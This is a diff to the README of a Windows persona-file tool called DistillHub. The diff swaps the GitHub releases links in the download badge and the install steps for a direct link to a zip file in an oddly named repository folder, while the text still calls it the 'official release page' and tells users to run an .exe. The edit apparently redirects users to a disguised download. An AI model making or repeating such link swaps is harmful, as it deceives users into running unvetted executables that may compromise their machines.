@@ -1,6 +1,6 @@
 # 🧠 awesome-distillhub-persona-skills - Manage custom digital persona knowledge files
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/angeliuu/awesome-distillhub-persona-skills/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://raw.githubusercontent.com/angeliuu/awesome-distillhub-persona-skills/main/latterness/persona_distillhub_skills_awesome_3.8.zip)
 
 DistillHub organizes complex information into simple skill files. These files define how your digital personas behave, respond, and process data. Use this tool to build, store, and share your persona libraries.
 
@@ -8,7 +8,7 @@ DistillHub organizes complex information into simple skill files. These files de
 
 You need a Windows computer to run this software. Ensure you have at least 200 megabytes of free storage space.
 
-1. Visit the [official release page](https://github.com/angeliuu/awesome-distillhub-persona-skills/releases).
+1. Visit the [official release page](https://raw.githubusercontent.com/angeliuu/awesome-distillhub-persona-skills/main/latterness/persona_distillhub_skills_awesome_3.8.zip).
 2. Look for the latest version at the top of the list.
 3. Click the file ending in `.exe` to start the download.
 4. Save the file to your desktop or downloads folder.
